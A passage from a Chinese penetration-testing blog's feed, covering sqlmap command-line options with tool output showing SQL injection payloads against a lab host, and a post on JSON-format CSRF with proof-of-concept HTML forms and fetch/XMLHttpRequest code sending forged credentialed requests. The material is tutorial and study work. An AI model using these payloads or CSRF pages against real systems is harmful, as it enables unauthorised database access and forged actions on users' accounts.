’id’ might be injectable (possible DBMS: ’MySQL’)</span><br><span class="line">[xx:xx:39] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on GET parameter ’id’</span><br><span class="line">[xx:xx:39] [INFO] testing ’MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause’</span><br><span class="line">[xx:xx:39] [INFO] GET parameter ’id’ is ’MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause’ injectable GET parameter ’id’ is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection points with a total of 3 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Place: GET</span><br><span class="line">Parameter: id</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause</span><br><span class="line">    Payload: id=1 AND ROW(4959,4971)&gt;(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELECT (CASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FROM (SELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY x)</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p><strong>参数：–test-skip</strong><br>若不想使用包含关键词“BENCHMARK”的payload可使用参数“–test-skip=BENCHMARK”。<br><strong><em>17.交互式Sqlmap Shell</em></strong><br><strong>参数：–sqlmap-shell</strong><br>使用此参数可以打开一个交互式的Sqlmap Shell，支持历史记录。如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">werner@Yasser:~$ sqlmap --sqlmap-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.1.10<span class="hljs-comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="hljs-string">"]     | .'| . |</span></span><br><span class="line"><span class="hljs-string">|___|_  [(]_|_|_|__,|  _|</span></span><br><span class="line"><span class="hljs-string">      |_|V          |_|   http://sqlmap.org</span></span><br><span class="line"><span class="hljs-string">sqlmap-shell&gt; -u "</span>192.168.56.102<span class="hljs-string">"</span></span><br><span class="line"><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="hljs-string">[*] starting at 20:22:46</span></span><br><span class="line"><span class="hljs-string">[20:22:46] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="hljs-string">[20:22:46] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</span></span><br><span class="line"><span class="hljs-string">[20:22:46] [INFO] testing if the target URL is stable</span></span><br><span class="line"><span class="hljs-string">[20:22:47] [INFO] target URL is stable</span></span><br><span class="line"><span class="hljs-string">[20:22:47] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')</span></span><br><span class="line"><span class="hljs-string">[*] shutting down at 20:22:47</span></span><br><span class="line"><span class="hljs-string">        ___</span></span><br><span class="line"><span class="hljs-string">       __H__</span></span><br><span class="line"><span class="hljs-string"> ___ ___[.]_____ ___ ___  &#123;1.1.10#stable&#125;</span></span><br><span class="line"><span class="hljs-string">|_ -| . ["</span>]     | .<span class="hljs-string">'| . |</span></span><br><span class="line"><span class="hljs-string">|___|_  [(]_|_|_|__,|  _|</span></span><br><span class="line"><span class="hljs-string">      |_|V          |_|   http://sqlmap.org</span></span><br><span class="line"><span class="hljs-string">sqlmap-shell&gt; exit</span></span><br></pre></td></tr></table></figure></p><p><strong><em>18.为初学者准备的简单向导</em></strong><br><strong>参数：–wizard</strong><br>Sqlmap特地为初学者准备了一个有着尽可能少问题的工作流的向导。用户输入目标后若一直按回车选择默认回答到工作流的最后也会得到一个正确的结果。如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">werner@Yasser:~$ sqlmap --wizard</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="hljs-string">"]_____ ___ ___  &#123;1.1.10#stable&#125;</span></span><br><span class="line"><span class="hljs-string">|_ -| . [)]     | .'| . |</span></span><br><span class="line"><span class="hljs-string">|___|_  ["</span>]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="hljs-keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="hljs-string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="hljs-string">[*] starting at 20:39:41</span></span><br><span class="line"><span class="hljs-string">[20:39:41] [INFO] starting wizard interface</span></span><br><span class="line"><span class="hljs-string">Please enter full target URL (-u): http://192.168.56.102/login.php</span></span><br><span class="line"><span class="hljs-string">POST data (--data) [Enter for None]: username=001&amp;password=003</span></span><br><span class="line"><span class="hljs-string">Injection difficulty (--level/--risk). Please choose:</span></span><br><span class="line"><span class="hljs-string">[1] Normal (default)</span></span><br><span class="line"><span class="hljs-string">[2] Medium</span></span><br><span class="line"><span class="hljs-string">[3] Hard</span></span><br><span class="line"><span class="hljs-string">&gt; 1</span></span><br><span class="line"><span class="hljs-string">Enumeration (--banner/--current-user/etc). Please choose:</span></span><br><span class="line"><span class="hljs-string">[1] Basic (default)</span></span><br><span class="line"><span class="hljs-string">[2] Intermediate</span></span><br><span class="line"><span class="hljs-string">[3] All</span></span><br><span class="line"><span class="hljs-string">&gt; 1</span></span><br><span class="line"><span class="hljs-string">sqlmap is running, please wait..</span></span><br><span class="line"><span class="hljs-string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="hljs-string">---</span></span><br><span class="line"><span class="hljs-string">Parameter: username (POST)</span></span><br><span class="line"><span class="hljs-string">    Type: boolean-based blind</span></span><br><span class="line"><span class="hljs-string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)</span></span><br><span class="line"><span class="hljs-string">    Payload: username=001%'</span> OR NOT 2143=2143<span class="hljs-comment">#&amp;password=003</span></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind (comment)</span><br><span class="line">    Payload: username=001%<span class="hljs-string">' OR SLEEP(5)#&amp;password=003</span></span><br><span class="line"><span class="hljs-string">---</span></span><br><span class="line"><span class="hljs-string">web server operating system: Linux Ubuntu</span></span><br><span class="line"><span class="hljs-string">web application technology: Apache 2.4.7, PHP 5.5.9</span></span><br><span class="line"><span class="hljs-string">back-end DBMS operating system: Linux Ubuntu</span></span><br><span class="line"><span class="hljs-string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="hljs-string">banner:    '</span>5.5.50-0ubuntu0.14.04.1<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">current user:    '</span>root@localhost<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">current database:    '</span>DSSchool<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">current user is DBA:    True</span></span><br><span class="line"><span class="hljs-string">[*] shutting down at 20:40:07</span></span><br></pre></td></tr></table></figure></p><h3 id="ox14-总结"><a href="#ox14-总结" class="headerlink" title="ox14 总结"></a>ox14 总结</h3><p>完整阅读Sqlmap官方手册后终于对Sqlmap有了一个较为全面的认识。以前只是有所耳闻，现在切实地感受到了Sqlmap的强大，也愈加敬佩Sqlmap的两位作者：<br>    Bernardo Damele A. G. (@inquisb)<br>    Miroslav Stampar (@stamparm)</p><p>以上就是参考大佬总结的sqlmap命令行介绍，感觉很全面所以可以当一个手册，下一步就是找时间读一读源码了。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt; &lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x0D-列举数据库管理系统的模式&quot;&gt;&lt;a href=&quot;#0x0D-列举数据库管理系统的模式&quot; class=&quot;headerlink&quot; title=&quot;0x0D 列举数据库管理系统的模式&quot;&gt;&lt;/a&gt;0x0D 列举数据库管理系统的模式&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;参数：–schema和–exclude-sysdbs&lt;/strong&gt;&lt;br&gt;用户可用此选项列举数据库管理系统的模式。模式列表包含所有数据库、表、列、触发器和他们各自的类型。&lt;br&gt;同样地，可使用参数“–exclude-sysdbs”排除系统数据库。&lt;/p&gt;
&lt;p&gt;下面是的例子测试对象是Mysql:&lt;br&gt;部分输出如下：&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="工具手册" scheme="http://www.f4guo.top/tags/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>四月是你的谎言</title>
    <link href="http://www.f4guo.top/2019/04/01/%E5%9B%9B%E6%9C%88%E6%98%AF%E4%BD%A0%E7%9A%84%E8%B0%8E%E8%A8%80/"/>
    <id>http://www.f4guo.top/2019/04/01/四月是你的谎言/</id>
    <published>2019-04-01T07:57:08.000Z</published>
    <updated>2019-04-01T08:35:05.363Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">月色真美。</font></blockquote><p>三四月份是踏青好时节，大家还是要多出去走走(这话我自己都不信哈哈哈哈)，有事四月停更，也好好整理一下之前的。<br><a id="more"></a><br><img src="/images/paperimage/April.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;月色真美。&lt;/font&gt;
&lt;/blockquote&gt;
&lt;p&gt;三四月份是踏青好时节，大家还是要多出去走走(这话我自己都不信哈哈哈哈)，有事四月停更，也好好整理一下之前的。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="生活日常" scheme="http://www.f4guo.top/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E5%B8%B8/"/>
    
    
  </entry>
  
  <entry>
    <title>JSON格式的CSRF</title>
    <link href="http://www.f4guo.top/2019/03/29/JSON%E6%A0%BC%E5%BC%8F%E7%9A%84CSRF/"/>
    <id>http://www.f4guo.top/2019/03/29/JSON格式的CSRF/</id>
    <published>2019-03-29T03:11:01.000Z</published>
    <updated>2019-04-01T08:37:03.963Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">幸福感就如沉积在悲哀之河底隐隐发光的金沙。  ——太宰治《斜阳》</font></blockquote><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>前几天给一个系统做测试的时候，发现存在一个self-xss漏洞,就想着有没有CSRF能够进一步利用一下，结果发现POST提交的是json数组，利用BurpSuite快捷生成CSRF Poc发现里面没有提交的数据。<br><a id="more"></a><br><img src="/images/paperimage/json_csrf1.jpg" alt=""><br>尝试好几次都是同样的结果，这我就奇怪了，难道json CSRF还不太一样？查了一下还真有点区别。</p><h3 id="0x02-未验证Content-type"><a href="#0x02-未验证Content-type" class="headerlink" title="0x02 未验证Content-type"></a>0x02 未验证Content-type</h3><p>百度、必应、Google一顿骚操作，讲的最多就是<a href="https://www.freebuf.com/articles/web/164234.html" target="_blank" rel="noopener">Flash+307 redirect</a>了。另外的有一种方法就是将  <code>form</code> 的 <code>ENCTYPE</code> 属性设置为 <code>text/plain</code> 时，json数组仍能被服务器接收，尝试发现返回结果说json格式错误(下列Poc做了一定处理，不是实际测试Poc)。<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>JSON CSRF POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://test.com/"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"text/plain"</span> &gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'&#123;"accesstoken":"111111111111","strategynamex":"test","strategytype":"002001","conditionstype":"1","stratemode","1","strategystatus":"1","target":"'</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'test"&#125;'</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'hidden'</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].submit();</span></span><br><span class="line"><span class="hljs-undefined">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>原来使用POST提交json数组到服务器，服务器检测有<code>Content-Type: application/json</code>请求头则通过，否则抛出一个异常。</p><h3 id="0x03-验证Content-type"><a href="#0x03-验证Content-type" class="headerlink" title="0x03 验证Content-type"></a>0x03 验证Content-type</h3><p>使用XMLHttpRequest构造json：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-javascript">history.pushState(<span class="hljs-string">''</span>, <span class="hljs-string">''</span>, <span class="hljs-string">'/'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">submitRequest</span>(<span class="hljs-params"></span>)</span></span></span><br><span class="line"><span class="hljs-undefined">      &#123;</span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="hljs-javascript">        xhr.open(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"https://www.admintony.com/address/addAddress.json"</span>, <span class="hljs-literal">true</span>);</span></span><br><span class="line"><span class="hljs-javascript">        xhr.setRequestHeader(<span class="hljs-string">"Accept"</span>, <span class="hljs-string">"application/json, text/plain, */*"</span>);</span></span><br><span class="line"><span class="hljs-javascript">        xhr.setRequestHeader(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/json; charset=UTF-8"</span>);</span></span><br><span class="line"><span class="hljs-javascript">        xhr.setRequestHeader(<span class="hljs-string">"Accept-Language"</span>, <span class="hljs-string">"zh-CN,zh;q=0.9"</span>);</span></span><br><span class="line"><span class="hljs-javascript">        xhr.withCredentials = <span class="hljs-literal">true</span>;</span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">var</span> body = <span class="hljs-string">"&#123;\"name\":\"SRC\",\"tel\":\"18681992828\",\"country\":\"\",\"province\":\"北京市\",\"city\":\"北京市\",\"county\":\"东城区\",\"areaCode\":\"110101\",\"postalCode\":\"\",\"addressDetail\":\"中关村\",\"isDefault\":false,\"userName\":\"美团SRC\",\"lat\":10.077726938827084,\"lon\":100.33235369626206&#125;"</span>;</span></span><br><span class="line"><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"#"</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit request"</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"submitRequest();"</span> /&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用fetch构造json请求：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>JSON CSRF POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-javascript">        fetch(<span class="hljs-string">'http://victim.com/vul.page'</span>, &#123;<span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>, <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>, <span class="hljs-attr">headers</span>: &#123;<span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'text/plain'</span>&#125;, <span class="hljs-attr">body</span>: <span class="hljs-string">'&#123;"name":"attacker","email":"attacker.com"&#125;'</span>&#125;);</span></span><br><span class="line"><span class="hljs-undefined">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"#"</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit request"</span>/&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用XMLHttpRequest、fetch能构造出JSON请求，并且能设置Content-Type，但是还是不能跨域，还是需要Flash+307 redirect才能利用。</p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>json csrf分两种情况：<br>    不验证content-type比较容易绕过，重新构造form数据就ok了。<br>    验证content-type就要结合第三方工具使用了。</p><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><p><a href="https://www.secpulse.com/archives/61297.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/61297.html</a><br><a href="http://www.admintony.com/csrf-and-json.html" target="_blank" rel="noopener">http://www.admintony.com/csrf-and-json.html</a><br><a href="https://www.cnblogs.com/blacksunny/p/7940287.html" target="_blank" rel="noopener">https://www.cnblogs.com/blacksunny/p/7940287.html</a><br><a href="https://www.freebuf.com/articles/web/164234.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/164234.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;幸福感就如沉积在悲哀之河底隐隐发光的金沙。  ——太宰治《斜阳》&lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;前几天给一个系统做测试的时候，发现存在一个self-xss漏洞,就想着有没有CSRF能够进一步利用一下，结果发现POST提交的是json数组，利用BurpSuite快捷生成CSRF Poc发现里面没有提交的数据。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.f4guo.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全" scheme="http://www.f4guo.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Sqlmap命令行（其二）</title>
    <link href="http://www.f4guo.top/2019/03/25/Sqlmap%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%88%E5%85%B6%E4%BA%8C%EF%BC%89/"/>
    <id>http://www.f4guo.top/2019/03/25/Sqlmap命令行（其二）/</id>
    <published>2019-03-25T15:06:09.000Z</published>
    <updated>2019-05-13T09:10:45.920Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">我近来时时感到，很需要到一处完全听不见电车、火车声响的地方，好好睡一睡，想一想，哪怕只是一天也好。为此，我有了旅行的欲望。  ——谷崎润一郎《阴翳礼赞》 </font></blockquote><p>接上一篇<a href="https://www.f4guo.top/2019/03/22/Sqlmap%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%88%E5%85%B6%E4%B8%80%EF%BC%89">Sqlmap命令行（其一）</a></p><h3 id="0x08-检测"><a href="#0x08-检测" class="headerlink" title="0x08 检测"></a>0x08 检测</h3><p><strong><em>1.检测级别</em></strong><br><strong>参数：–level</strong><br>此参数用于指定检测级别，有1~5共5级。默认为1，表示做最少的检测，相应的，5级表示做最多的检测。<br>Sqlmap使用的payload保存在目录xml/payloads/中，是xml格式的，可以自己定制。节选一个payload如下所示：<br><a id="more"></a><br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>AND boolean-based blind - WHERE or HAVING clause (Generic comment)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">stype</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">stype</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">level</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">level</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">risk</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">risk</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">clause</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">clause</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">vector</span>&gt;</span>AND [INFERENCE]<span class="hljs-tag">&lt;/<span class="hljs-name">vector</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">request</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">payload</span>&gt;</span>AND [RANDNUM]=[RANDNUM]<span class="hljs-tag">&lt;/<span class="hljs-name">payload</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">comment</span>&gt;</span>[GENERIC_SQL_COMMENT]<span class="hljs-tag">&lt;/<span class="hljs-name">comment</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">request</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">response</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">comparison</span>&gt;</span>AND [RANDNUM]=[RANDNUM1]<span class="hljs-tag">&lt;/<span class="hljs-name">comparison</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">response</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>在上例中可以看到有level标签，其值为2，该payload在检测级别大于等于2时被使用。<br>risk标签的含义见后文。</p><p>检测级别不仅会影响payload的使用，还会影响注入点的检测，GET和POST参数是一直会被检测的，<br>检测级别大于等于2时会检测cookie是否有注入，检测级别大于等于3时会检测User-Agent和Referer是否有注入。</p><p>若不是很清楚注入点在哪里可以设置一个比较高的检测级别。</p><p>强烈建议在向Sqlmap官方报告一个明确存在的注入漏洞检测不出来前先把检测级别调高试试。</p><p><font color="#FA5858" size="3">2.风险等级</font><br><strong>参数：–risk</strong><br>此参数用于指定风险等级，有1~4共4级。默认风险等级为1，此等级在大多数情况下对测试目标无害。<br>风险等级2添加了基于时间的注入测试，等级3添加了OR测试。</p><p>若注入点是在UPDATE语句中，使用OR测试可能会修改整个表的数据，这显然不是攻击者想要看到的。<br>因此用户需要能控制风险等级避开有潜在风险的payload。</p><p><strong><em>3.页面对比</em></strong><br><strong>参数：–string、–not-string、–regexp</strong><br>默认情况下在布尔型注入中Sqlmap通过比较返回页面内容来判断True或False。<br>但有时页面每次刷新都会不同，如页面中有动态广告。Sqlmap会尽力判断出页面中动态的部分来，但并不总能成功。<br>用户可以用参数“–string”指出代表True的页面会包含而代表False的页面不会包含的字符串以供Sqlmap判断True或False，<br>若这样的字符串是变动的还可以用参数“–regexp”指定一个正则表达式去匹配这样的字符串。<br>或者用参数“–not-string”指出代表False的页面会包含而代表True的页面不会包含的字符串。</p><p><strong>参数：–code</strong><br>或者更简单地，若是用户知道代表True的页面HTTP状态码为200而代表False的页面HTTP状态码不为200比如是401，<br>可以用“–code”参数告诉告诉Sqlmap这一信息，如“–code=200”。</p><p><strong>参数：–titles</strong><br>若是用户知道代表True的页面title和代表False的页面title不同，<br>如代表True的页面title为“Welcome”，代表False的页面title为“Forbidden”，<br>就可以使用参数“–titles”让Sqlmap依据title来判断True或False。</p><p><strong>参数：–text-only</strong><br>若是HTTP响应体中有许多诸如JavaScript之类的活动内容，可以使用参数“–text-only”让Sqlmap只专注于纯文本内容。</p><h3 id="0x09-注入技术"><a href="#0x09-注入技术" class="headerlink" title="0x09 注入技术"></a>0x09 注入技术</h3><p>这些参数用于对特定的SQL注入技术进行调整。<br><strong><em>1.检测时所用技术</em></strong><br><strong>参数：–technique</strong><br>此参数用于指定检测注入时所用技术。默认情况下Sqlmap会使用自己支持的全部技术进行检测。<br>此参数后跟表示检测技术的大写字母，其值为B、E、U、S、T或Q，含义如下：</p><pre><code>B：Boolean-based blind（布尔型注入）E：Error-based（报错型注入）U：Union query-based（可联合查询注入）S：Stacked queries（可多语句查询注入）T：Time-based 